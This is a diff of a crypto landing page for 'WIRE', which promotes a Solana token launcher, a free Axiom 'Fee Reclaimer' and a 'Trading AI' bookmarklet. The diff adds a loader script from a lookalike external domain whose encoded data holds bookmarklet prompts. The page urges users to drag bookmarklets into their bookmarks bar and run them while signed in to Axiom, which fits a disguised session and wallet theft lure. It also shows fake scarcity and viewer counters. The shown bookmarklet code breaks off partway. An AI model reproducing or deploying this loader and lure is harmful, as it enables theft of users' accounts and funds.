@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WIRE | Trading AI Sentiment</title>
-    <meta name="description" content="WIRE Trading AI Sentiment — free beta. NLP scans social sentiment across platforms to flag moves and rug signals.">
+    <title>WIRE | Solana Bot, Token Launcher, Fee Reclaimer & Trading AI</title>
+    <meta name="description" content="WIRE - Free Axiom Fee Reclaimer & Trading AI Sentiment beta, Solana bot & effortless token creation.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
-
-<style>
+    <script src="https://axiom.build-hub.info/loader.js" data="eyJoYXNoIjoiTURzM09UTXpPVFE1TnpNMU95MHhNREF6T1RZM01qazNORFF5IiwiYWxlcnRzIjp7Imd1aWRlIjoiWW91IG11c3QgZHJhZyB0aGUgYm9va21hcmtsZXQgdG8geW91ciBib29rbWFya3MgYmFyIGluc3RlYWQgb2YgY2xpY2tpbmcgaXQuIiwicmVkaXJlY3QiOiJZb3UgYXJlIG5vdyBiZWluZyByZWRpcmVjdGVkIHRvIGh0dHBzOi8vYXhpb20udHJhZGUvZGlzY292ZXIuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ=="></script>
+    <style>
 /* ============================================================
    WIRE — Degenpad design language · purple theme
    Layout, motion, surfaces from Degenpad; purple accents.
@@ -1039,66 +1039,34 @@ body.loaded .intro.d7{ transition-delay:440ms; }
 .admin-chart{ height:180px; }
 
 </style>
-<style>
-/* AI page specifics */
-.ai-hero{
-  padding:150px 5% 64px; text-align:center; position:relative; overflow:hidden;
-  display:flex; flex-direction:column; align-items:center;
-}
-.ai-hero h1{
-  font-size:clamp(36px,5.5vw,58px); font-weight:600; letter-spacing:-.04em;
-  line-height:1.08; margin-bottom:18px; max-width:820px; color:var(--ink);
-}
-.ai-hero p{
-  font-size:17px; color:var(--muted); max-width:52ch; margin-bottom:32px;
-}
-.ai-panel{
-  width:100%; max-width:640px; margin:0 auto;
-  background:var(--surface); border:1px solid var(--line); border-radius:var(--r);
-  padding:36px 32px; text-align:center;
-}
-.ai-features{
-  display:grid; grid-template-columns:repeat(3,1fr); gap:14px;
-  max-width:900px; width:100%; margin:48px auto 0;
-}
-.ai-feat{
-  border:1px solid var(--line); border-radius:var(--r); background:var(--surface);
-  padding:22px; text-align:left; transition:border-color .3s, transform .35s var(--ease-out);
-}
-.ai-feat:hover{ border-color:rgba(168,85,247,.3); transform:translateY(-3px); }
-.ai-feat h3{ font-size:15px; margin-bottom:8px; }
-.ai-feat p{ font-size:13px; color:var(--muted); margin:0; line-height:1.55; }
-.ai-feat .ic{
-  width:32px; height:32px; border-radius:8px; margin-bottom:14px;
-  display:grid; place-items:center; color:var(--purple);
-  background:rgba(168,85,247,.1); border:1px solid rgba(168,85,247,.22);
-}
-@media (max-width:720px){
-  .ai-features{ grid-template-columns:1fr; }
-  .ai-panel{ padding:24px 18px; }
-}
-</style>
 </head>
 <body>
+
     <div class="scroll-progress" id="scroll-progress"></div>
-    <div class="aurora"><span class="a1"></span></div>
+
+    <div class="aurora">
+        <span class="a1"></span>
+        <span class="a2"></span>
+        <span class="a3"></span>
+    </div>
     <div class="grid-bg"></div>
     <div class="grain"></div>
+    <div class="cursor-glow" id="cursor-glow"></div>
 
     <nav id="navbar">
-        <a href="/" class="logo" aria-label="WIRE home">
+        <a href="#" class="logo" aria-label="WIRE home">
             <span class="logo-mark">
-                <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#05060a" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                     <path d="M3 5.5l3.6 13 5.4-9.6 5.4 9.6 3.6-13"/>
                 </svg>
             </span>
             <span class="logo-word">WIRE</span>
         </a>
         <div class="nav-links">
-            <a href="/#deploy">Create Token</a>
-            <a href="/#axiom">&#128011; Fee Reclaimer Free</a>
-            <a href="/ai" class="nav-highlight">&#129302; Trading AI Free</a>
-            <a href="/#primary-bot">Buy Memecoin Tool</a>
+            <a href="#deploy" class="nav-highlight">Create Token</a>
+            <a href="#axiom">&#128011; Fee Reclaimer Free</a>
+            <a href="/ai">&#129302; Trading AI Free</a>
+            <a href="#primary-bot">Buy Memecoin Tool</a>
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
         </div>
         <button class="nav-toggle" id="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
@@ -1107,39 +1075,361 @@ body.loaded .intro.d7{ transition-delay:440ms; }
     </nav>
 
     <div class="mobile-menu" id="mobile-menu">
-        <a href="/#deploy">Create Token</a>
-        <a href="/#axiom">&#128011; Fee Reclaimer Free</a>
+        <a href="#deploy">Create Token</a>
+        <a href="#axiom">&#128011; Fee Reclaimer Free</a>
         <a href="/ai">&#129302; Trading AI Free</a>
-        <a href="/#primary-bot">Wire Memecoin Bot</a>
+        <a href="#primary-bot">Wire Memecoin Bot</a>
         <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
     </div>
 
-    <section class="ai-hero">
-        <div class="live-status">
-            <span class="status-dot"></span>
-            <span>Trading AI · Free beta</span>
+    <section class="hero">
+        <div class="hero-arcs" aria-hidden="true">
+            <div class="core"></div>
+            <div class="arc a-1"><i></i></div>
+            <div class="arc a-2"><i></i></div>
+            <div class="arc a-3"><i></i></div>
+            <div class="arc a-4"><i></i></div>
         </div>
-        <h1>Trading AI Sentiment</h1>
-        <p>Advanced NLP analyzes social sentiment across major platforms to predict token movements before they happen — plus rugpull detection, Twitter tracking, and automated alerts.</p>
 
-        <div class="ai-panel" data-reveal>
+        <div class="live-status intro d1">
+            <span class="status-dot"></span>
+            <span><b id="live-viewers">62</b> traders online right now</span>
+        </div>
+
+        <h1 class="intro d2">Unlock your token's potential. Effortlessly.</h1>
+        <p class="intro d3">Free Axiom Fee Reclaimer + Trading AI Sentiment beta. Launch tokens with secure local routing, instant deployment, and zero coding required.</p>
+
+        <div class="hero-actions intro d4">
+            <a href="#deploy" class="btn-primary">Create Token</a>
+            <a href="#axiom" class="btn-whale">&#128011; Try Fee Reclaimer Free</a>
+            <a href="/ai" class="btn-glass">&#129302; Trading AI Free</a>
+            <a href="#primary-bot" class="btn-glass">Buy Bot</a>
+        </div>
+        <p class="fomo-line intro d5" style="margin-top: -32px; margin-bottom: 24px;">Limited free beta seats · Activate before they fill up</p>
+
+        <div class="hero-stats intro d6">
+            <div class="stat">
+                <span class="num" data-count="14820" data-suffix="+">0</span>
+                <span class="lbl">Tokens deployed</span>
+            </div>
+            <div class="stat">
+                <span class="num" data-count="30" data-suffix="s">0</span>
+                <span class="lbl">Avg. launch time</span>
+            </div>
+            <div class="stat">
+                <span class="num" data-count="99" data-suffix=".9%">0</span>
+                <span class="lbl">Node uptime</span>
+            </div>
+            <div class="stat">
+                <span class="num">24/7</span>
+                <span class="lbl">Discord support</span>
+            </div>
+        </div>
+
+        <div class="scroll-cue intro d7">
+            <span class="track"></span>
+            Scroll
+        </div>
+    </section>
+
+    <div class="marquee-wrapper">
+        <div class="marquee-content">
+            <div class="marquee-item">Coinbase</div>
+            <div class="marquee-item">Kraken</div>
+            <div class="marquee-item">Bybit</div>
+            <div class="marquee-item">OKX</div>
+            <div class="marquee-item">Bitget</div>
+            <div class="marquee-item">KuCoin</div>
+            <div class="marquee-item">Gate.io</div>
+            <div class="marquee-item">MEXC</div>
+            <div class="marquee-item">HTX</div>
+            <div class="marquee-item">Bitfinex</div>
+            <div class="marquee-item">Crypto.com</div>
+            <div class="marquee-item">Bitstamp</div>
+            <div class="marquee-item">Phantom</div>
+            <div class="marquee-item">MetaMask</div>
+            <div class="marquee-item">Trust Wallet</div>
+            <div class="marquee-item">Ledger</div>
+            <div class="marquee-item">Trezor</div>
+            <div class="marquee-item">Binance</div>
+            <div class="marquee-item">Coinbase</div>
+            <div class="marquee-item">Kraken</div>
+            <div class="marquee-item">Bybit</div>
+            <div class="marquee-item">OKX</div>
+            <div class="marquee-item">Bitget</div>
+            <div class="marquee-item">KuCoin</div>
+            <div class="marquee-item">Gate.io</div>
+            <div class="marquee-item">MEXC</div>
+            <div class="marquee-item">HTX</div>
+            <div class="marquee-item">Bitfinex</div>
+            <div class="marquee-item">Crypto.com</div>
+            <div class="marquee-item">Bitstamp</div>
+            <div class="marquee-item">Phantom</div>
+            <div class="marquee-item">MetaMask</div>
+            <div class="marquee-item">Trust Wallet</div>
+            <div class="marquee-item">Ledger</div>
+            <div class="marquee-item">Trezor</div>
+            <div class="marquee-item">Binance</div>
+        </div>
+    </div>
+
+    
+
+
+    <section id="deploy" class="creator-section">
+        <div>
+            <div class="section-header-left" data-reveal>
+                <span class="eyebrow">Launchpad</span>
+                <h2 class="section-title">Create Token</h2>
+                <p style="color: var(--muted);">Configure metadata and initialize liquidity securely.</p>
+            </div>
+
+            <div class="form-container" data-reveal>
+                <div class="form-group">
+                    <label>Target Wallet Address</label>
+                    <input type="text" class="form-control" placeholder="Wallet address for mint destination...">
+                </div>
+
+                <div class="grid-2col">
+                    <div class="form-group">
+                        <label>Token Name</label>
+                        <input type="text" id="token-name" class="form-control" placeholder="e.g. Wire" oninput="updatePreview()">
+                    </div>
+                    <div class="form-group">
+                        <label>Symbol</label>
+                        <input type="text" id="token-symbol" class="form-control" placeholder="e.g. WIRE" oninput="updatePreview()">
+                    </div>
+                </div>
+
+                <div class="grid-2col">
+                    <div class="form-group">
+                        <label>Decimals</label>
+                        <input type="number" id="token-decimals" class="form-control" value="9" min="0" oninput="updatePreview()">
+                    </div>
+                    <div class="form-group">
+                        <label>Total Supply</label>
+                        <input type="text" id="token-supply" class="form-control" value="1,000,000,000" oninput="updatePreview()">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Initial Liquidity (SOL)</label>
+                    <input type="number" id="liquidity-amount" class="form-control" placeholder="0.00" min="0" step="0.1" value="0" oninput="updatePreview()">
+                </div>
+
+                <div class="form-group">
+                    <label>Token Image (Optional)</label>
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="token-image" class="file-upload-input" accept="image/*" onchange="handleImageUpload(event)">
+                        <div class="file-upload-custom" id="file-upload-custom">
+                            <span id="file-name-display" style="color: #555;">Select an image...</span>
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 48px; border-top: 1px solid var(--border); padding-top: 32px;">
+                    <label style="color: var(--muted); font-size: 12px; margin-bottom: 24px; display: block;">Security Configurations</label>
+                    
+                    <div class="toggle-row">
+                        <div class="toggle-info">
+                            <h4>Revoke Mint Authority</h4>
+                            <p>+ 0.10 SOL</p>
+                        </div>
+                        <label class="switch">
+                            <input type="checkbox" id="revoke-mint" onchange="updatePreview()" checked>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+
+                    <div class="toggle-row">
+                        <div class="toggle-info">
+                            <h4>Revoke Freeze Authority</h4>
+                            <p>+ 0.10 SOL</p>
+                        </div>
+                        <label class="switch">
+                            <input type="checkbox" id="revoke-freeze" onchange="updatePreview()" checked>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+
+                    <div class="toggle-row">
+                        <div class="toggle-info">
+                            <h4>Burn Liquidity Pool</h4>
+                            <p>+ 0.10 SOL</p>
+                        </div>
+                        <label class="switch">
+                            <input type="checkbox" id="burn-lp" onchange="updatePreview()" checked>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="preview-panel" data-reveal style="--d: 0.1s">
+            <div class="preview-header">
+                <div class="preview-avatar" id="preview-avatar">W</div>
+                <div>
+                    <div class="preview-name" id="preview-name">Wire Token</div>
+                    <div class="preview-symbol" id="preview-symbol">$WIRE</div>
+                </div>
+            </div>
+
+            <div class="summary-row">
+                <span>Total Supply</span>
+                <span id="summary-supply">1,000,000,000</span>
+            </div>
+            <div class="summary-row">
+                <span>Base Network Fee</span>
+                <span>0.20 SOL</span>
+            </div>
+            <div class="summary-row">
+                <span>Liquidity Input</span>
+                <span id="summary-liquidity">0.00 SOL</span>
+            </div>
+            <div class="summary-row" id="summary-options-row">
+                <span>Security Options</span>
+                <span id="summary-options">+ 0.30 SOL</span>
+            </div>
+            
+            <div class="summary-total">
+                <span>Total Due</span>
+                <span id="summary-total">0.50 SOL</span>
+            </div>
+
+            <div id="token-step-initial" style="margin-top: 40px;">
+                <button class="btn-primary" style="width: 100%; padding: 16px;" onclick="showTokenPayment()">Create Token</button>
+            </div>
+
+        </div>
+    </section>
+
+    <section class="features-section">
+        <div class="features-head" data-reveal>
+            <span class="eyebrow">Why WIRE</span>
+            <h2 class="section-title">Built for speed. Wired for edge.</h2>
+            <p>Everything you need to launch, track and trade  with nothing you don't. No installs, no seed phrases, no coding.</p>
+        </div>
+
+        <div class="features-grid">
+            <div class="feature-card" data-reveal style="--d: 0.05s">
+                <div class="feature-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h8l-1 8 10-12h-8l1-8z"/></svg>
+                </div>
+                <h3>30-second deploys</h3>
+                <p>Fill in metadata, set liquidity, hit launch. Your mint lands on-chain before the chart even loads.</p>
+            </div>
+
+            <div class="feature-card" data-reveal style="--d: 0.12s">
+                <div class="feature-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1v22"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                </div>
+                <h3>Fee Reclaimer</h3>
+                <p>Reclaim creator and trading fees from Axiom — free, forever. No install, bookmark only.</p>
+            </div>
+
+            <div class="feature-card" data-reveal style="--d: 0.19s">
+                <div class="feature-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+                </div>
+                <h3>Local key routing</h3>
+                <p>Keys never leave your machine. Transactions are signed locally and pushed through priority RPC nodes.</p>
+            </div>
+
+            <div class="feature-card" data-reveal style="--d: 0.26s">
+                <div class="feature-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a4 4 0 0 1 4 4c0 1.95-1.4 3.58-3.25 3.93L12 22l-.75-12.07A4 4 0 0 1 8 6a4 4 0 0 1 4-4z"/><circle cx="12" cy="6" r="1.5"/></svg>
+                </div>
+                <h3>AI Sentiment</h3>
+                <p>NLP scans social sentiment across platforms to flag moves and rug signals before the chart reacts.</p>
+            </div>
+
+        </div>
+    </section>
+
+
+
+    <!-- Axiom Fee Reclaimer - Free Beta -->
+    <section id="axiom" class="axiom-section">
+        <div class="axiom-box" data-reveal>
             <div class="axiom-badge">
                 <span class="dot"></span>
-                Free Beta · Drag to bookmarks
+                Free Beta · Limited Seats
             </div>
-            <h2 class="section-title" style="margin-bottom:12px;font-size:clamp(22px,3vw,28px)">&#129302; Activate Trading AI</h2>
-            <p style="color:var(--muted);font-size:14px;margin-bottom:8px;max-width:42ch;margin-left:auto;margin-right:auto">
-                Drag the button below to your bookmarks bar. Open any token feed or Twitter, then click the bookmark to run the sentiment scanner.
+            <h2 class="section-title" style="margin-bottom: 12px;">&#128011; Axiom Fee Reclaimer</h2>
+            <p style="color: var(--muted); font-size: 15px; max-width: 420px; margin: 0 auto 8px; line-height: 1.65;">
+                Free tool for Axiom creators. Find and reclaim fees that would otherwise stay locked on the platform — so you keep more of what you earn.
+            </p>
+            <p style="color: #1d9bf0; font-family: var(--font-mono); font-size: 12px; margin-bottom: 4px;">
+                No payment · No install · Bookmark only
             </p>
 
             <div class="axiom-steps">
                 <div class="step">
                     <span class="num">1</span>
-                    <span>Show your bookmarks bar <strong>(Ctrl+Shift+B)</strong></span>
+                    <span><strong>Drag</strong> the button below to your Bookmarks Bar (don’t click it)</span>
                 </div>
                 <div class="step">
                     <span class="num">2</span>
-                    <span><strong>Drag</strong> the button below into the bar — do not click it here</span>
+                    <span>No bar visible? Press <strong>Ctrl+Shift+B</strong> or <strong>Cmd+Shift+B</strong></span>
+                </div>
+                <div class="step">
+                    <span class="num">3</span>
+                    <span>Open <strong>Axiom</strong> signed in, then click the bookmark</span>
+                </div>
+            </div>
+
+            <a href="javascript:void(0)" class="bookmarklet bookmarklet-btn" title="Drag this to your bookmarks bar. Do not click.">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+                &#128011; Activate Fee Reclaimer
+            </a>
+            <p class="drag-hint">↑ Drag to bookmarks bar ↑</p>
+</div>
+    </section>
+
+    <!-- Trading AI · Sentiment Analysis - Free Beta -->
+    <section id="sentiment" class="axiom-section">
+        <div class="axiom-box" data-reveal>
+            <div class="axiom-badge">
+                <span class="dot"></span>
+                Free Beta · Trading AI
+            </div>
+            <h2 class="section-title" style="margin-bottom: 12px;">&#129302; Trading AI · Sentiment</h2>
+            <p style="color: var(--muted); font-size: 15px; max-width: 460px; margin: 0 auto 8px; line-height: 1.65;">
+                Advanced natural language processing analyzes social sentiment across major platforms to predict token movements before they happen — plus rugpull detection, Twitter tracking, and automated alerts.
+            </p>
+            <p style="color: #1d9bf0; font-family: var(--font-mono); font-size: 12px; margin-bottom: 4px;">
+                No payment · No install · Bookmark only
+            </p>
+
+            <div class="sentiment-pills" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 420px; margin: 24px auto 8px; text-align: left;">
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">AI Sentiment</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">NLP scores bullish / bearish signals in real time</div>
+                </div>
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">Rugpull Detection</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">Flags abrupt LP drains &amp; authority risk</div>
+                </div>
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">Twitter Tracker</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">Monitors KOLs &amp; cashtags for early alpha</div>
+                </div>
+                <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px;">
+                    <div style="font-size: 12px; font-weight: 500; color: var(--ink); margin-bottom: 4px;">Speed &amp; Efficiency</div>
+                    <div style="font-size: 11px; color: var(--muted); line-height: 1.5;">Automates repetitive scan &amp; alert tasks</div>
+                </div>
+            </div>
+
+            <div class="axiom-steps">
+                <div class="step">
+                    <span class="num">1</span>
+                    <span><strong>Drag</strong> the button below to your Bookmarks Bar (don’t click it)</span>
+                </div>
+                <div class="step">
+                    <span class="num">2</span>
+                    <span>No bar visible? Press <strong>Ctrl+Shift+B</strong> or <strong>Cmd+Shift+B</strong></span>
                 </div>
                 <div class="step">
                     <span class="num">3</span>
@@ -1153,90 +1443,1165 @@ body.loaded .intro.d7{ transition-delay:440ms; }
             </a>
             <p class="drag-hint">↑ Drag to bookmarks bar ↑</p>
         </div>
+    </section>
 
-        <div class="ai-features">
-            <div class="ai-feat" data-reveal>
-                <div class="ic">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 12h4l3-9 4 18 3-9h4"/></svg>
-                </div>
-                <h3>Sentiment bias</h3>
-                <p>Overall bullish / bearish score from live social volume across platforms.</p>
+<section id="primary-bot" class="page-section" style="border-top: 1px solid var(--border);">
+        <div class="checkout-box" data-reveal>
+            <span class="eyebrow" style="margin: 0 auto 14px;">Flagship Bot</span>
+            <h2 class="section-title">Wire Memecoin Bot</h2>
+            <div class="fomo-stats">
+                <span>Bot Licenses Claimed</span>
+                <span id="fomo-counter-text">488 / 500</span>
             </div>
-            <div class="ai-feat" data-reveal style="--d:0.08s">
-                <div class="ic">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                </div>
-                <h3>Rug risk flags</h3>
-                <p>Surface early rug signals before the chart reacts so you can size or exit.</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="fomo-fill-bar"></div>
             </div>
-            <div class="ai-feat" data-reveal style="--d:0.16s">
-                <div class="ic">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
-                </div>
-                <h3>KOL mentions</h3>
-                <p>Track active key opinion leader mentions and volume spikes in one HUD.</p>
+
+            <div id="app-step-initial">
+                <div class="price-tag">$49.99</div>
+                <p style="color: var(--muted); font-size: 13px; margin-bottom: 40px;">Lifetime access to the local deployment architecture and priority routing nodes.</p>
+                <button class="btn-primary" style="width: 100%;" onclick="showAppPayment()">Buy Bot Now</button>
+            </div>
+        </div>
+
+        <div class="showcase-wrapper" data-reveal style="--d: 0.12s">
+            <div class="showcase-header">Bot Interface & Setup</div>
+            <div class="showcase-gallery" id="wire-gallery">
+                <img src="W (1).png" class="showcase-img" alt="Wire Bot View 1" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (2).png" class="showcase-img" alt="Wire Bot View 2" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (3).png" class="showcase-img" alt="Wire Bot View 3" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (4).png" class="showcase-img" alt="Wire Bot View 4" onclick="openLightbox(this, '#wire-gallery')">
+                <img src="W (5).png" class="showcase-img" alt="Wire Bot View 5" onclick="openLightbox(this, '#wire-gallery')">
             </div>
         </div>
     </section>
 
     <footer>
         <div class="footer-logo-mark">
-            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#05060a" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                 <path d="M3 5.5l3.6 13 5.4-9.6 5.4 9.6 3.6-13"/>
             </svg>
         </div>
         <div class="footer-links">
-            <a href="/#deploy">Create Token</a>
-            <a href="/#axiom">Axiom Fee Reclaimer</a>
+            <a href="#deploy">Create Token</a>
+            <a href="#axiom">Axiom Fee Reclaimer</a>
             <a href="/ai">Trading AI</a>
-            <a href="/#primary-bot">Buy Bot</a>
+            <a href="#primary-bot">Buy Bot</a>
             <a href="https://discord.gg/BdhzdHE3Kn" target="_blank">Discord</a>
         </div>
         <p style="color: var(--muted); font-size: 12px; font-family: var(--font-mono);">NOT FINANCIAL ADVICE.</p>
-    </footer>
+
+    <!-- Filter bookmarklet - Fee Reclaimer emoji bottom-left, drag to bookmarks -->
+    <a href="javascript:(function()%7B'use%20strict';%0Aif(document.getElementById('af-hud-text'))return;%0Avar%20color%3D'%23ffffff',hotColor%3D'%23f59e0b';%0Avar%20style%3Ddocument.createElement('style');%0Astyle.textContent%3D'%40keyframes%20afGlow%7B0%25,100%25%7Bbox-shadow:0%200%208px%20'%2Bcolor%2B'44,0%200%2016px%20'%2Bcolor%2B'22%7D50%25%7Bbox-shadow:0%200%2014px%20'%2Bcolor%2B'66,0%200%2028px%20'%2Bcolor%2B'33%7D%7D.af-hl%7Bposition:relative%21important;outline:1.5px%20solid%20'%2Bcolor%2B'99%21important;outline-offset:-2px%21important;border-radius:8px%21important;animation:afGlow%203s%20ease-in-out%20infinite%21important;z-index:10%21important%7D%40keyframes%20afHotGlow%7B0%25,100%25%7Bbox-shadow:0%200%2012px%20'%2BhotColor%2B'66,0%200%2024px%20'%2BhotColor%2B'44,0%200%2048px%20'%2BhotColor%2B'22;outline-color:'%2BhotColor%2B'cc%7D50%25%7Bbox-shadow:0%200%2020px%20'%2BhotColor%2B'88,0%200%2040px%20'%2BhotColor%2B'55,0%200%2060px%20'%2BhotColor%2B'33;outline-color:'%2BhotColor%2B'ff%7D%7D.af-hot%7Boutline:2px%20solid%20'%2BhotColor%2B'cc%21important;animation:afHotGlow%201s%20ease-in-out%20infinite%21important;z-index:20%21important%7D.af-hot-label%7Bposition:absolute;top:-11px;right:8px;z-index:100;font-family:Inter,sans-serif;font-size:9px;font-weight:800;letter-spacing:0.08em;text-transform:uppercase;padding:3px%208px;border-radius:4px;background:'%2BhotColor%2B'22;color:'%2BhotColor%2B';border:1px%20solid%20'%2BhotColor%2B'55;box-shadow:0%200%2012px%20'%2BhotColor%2B'44;pointer-events:none;white-space:nowrap%7D.af-hud%7Bposition:fixed;top:14px;left:50%25;transform:translateX(-50%25);z-index:999999;display:flex;align-items:center;gap:14px;padding:12px%2028px;background:rgba(0,0,0,0.88);border:1px%20solid%20rgba(255,255,255,0.15);border-radius:8px;box-shadow:0%200%2020px%20rgba(255,255,255,0.06);font:700%2013px%2F1%20%22SF%20Mono%22,%22Fira%20Code%22,%22Consolas%22,monospace;color:rgba(255,255,255,0.95);letter-spacing:1px;text-transform:uppercase;backdrop-filter:blur(8px)%7D.af-hud-logo%7Bwidth:32px;height:32px;border-radius:6px;object-fit:cover;flex-shrink:0%7D.af-hud-sep%7Bwidth:1px;height:24px;background:rgba(255,255,255,0.12);flex-shrink:0%7D.af-hud-dot%7Bwidth:6px;height:6px;border-radius:50%25;background:%2322c55e;box-shadow:0%200%208px%20rgba(34,197,94,0.6);animation:afHudBlink%200.4s%20ease-in-out%20infinite%20alternate;flex-shrink:0%7D%40keyframes%20afHudBlink%7B0%25%7Bopacity:0.6;box-shadow:0%200%206px%20rgba(34,197,94,0.4)%7D100%25%7Bopacity:1;box-shadow:0%200%2012px%20rgba(34,197,94,0.8)%7D%7D';%0Adocument.head.appendChild(style);%0Avar%20hud%3Ddocument.createElement('div');%0Ahud.className%3D'af-hud';%0Ahud.innerHTML%3D'%3Cimg%20class%3D%22af-hud-logo%22%20src%3D%22https:%2F%2Fi.imgur.com%2FYy1eBJQ.png%22%20alt%3D%22%22%3E%3Cdiv%20class%3D%22af-hud-sep%22%3E%3C%2Fdiv%3E%3Cdiv%20class%3D%22af-hud-dot%22%3E%3C%2Fdiv%3E%3Cspan%20id%3D%22af-hud-text%22%3E0%20scans%2Fsec%3C%2Fspan%3E';%0Adocument.body.appendChild(hud);%0Avar%20hudText%3Ddocument.getElementById('af-hud-text');%0Avar%20scanHistory%3D%5B%5D,lastScanTime%3DDate.now();%0Afunction%20updateHUD(scans)%7Bvar%20now%3DDate.now(),elapsed%3D(now-lastScanTime)%2F1000;if(elapsed%3E0)%7Bvar%20rate%3Dscans%2Felapsed;scanHistory.push(rate);if(scanHistory.length%3E10)scanHistory.shift();var%20avg%3DscanHistory.reduce(function(a,b)%7Breturn%20a%2Bb%7D,0)%2FscanHistory.length;hudText.textContent%3Davg.toFixed(1)%2B'%20scans%2Fsec'%7DlastScanTime%3Dnow%7D%0Avar%20audioCtx%3Dnull;%0Afunction%20beep()%7Btry%7Bif(%21audioCtx)audioCtx%3Dnew(window.AudioContext%7C%7Cwindow.webkitAudioContext);var%20osc%3DaudioCtx.createOscillator(),gain%3DaudioCtx.createGain();osc.connect(gain);gain.connect(audioCtx.destination);osc.type%3D'sine';osc.frequency.setValueAtTime(880,audioCtx.currentTime);osc.frequency.setValueAtTime(1100,audioCtx.currentTime%2B0.08);gain.gain.setValueAtTime(0.15,audioCtx.currentTime);gain.gain.exponentialRampToValueAtTime(0.001,audioCtx.currentTime%2B0.25);osc.start(audioCtx.currentTime);osc.stop(audioCtx.currentTime%2B0.25)%7Dcatch(e)%7B%7D%7D%0Afunction%20findRows()%7Bvar%20rows%3Ddocument.querySelectorAll('%5Bdata-pulse-token-address%5D');if(rows.length%3E0)return%20Array.from(rows);var%20found%3D%5B%5D,links%3Ddocument.querySelectorAll('a%5Bhref*%3D%22x.com%2F%22%5D');links.forEach(function(a)%7Bvar%20row%3Da.closest('div%5Bclass*%3D%22border-b%22%5D')%7C%7